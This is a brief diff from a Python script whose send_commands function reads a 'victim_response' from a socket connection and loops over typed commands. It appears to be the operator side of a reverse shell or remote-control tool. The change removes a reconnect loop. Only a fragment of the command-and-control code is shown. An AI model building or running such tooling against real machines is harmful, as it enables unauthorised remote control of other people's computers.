@@ -10,9 +10,6 @@ def send_commands(conn):
     victim_response = conn.recv(4096)
     print(victim_response.decode("utf-8"))
 
-    while not victim_response.decode("utf-8"):
-        reconnect()
-
     while True:
         try:
             cmd = input()
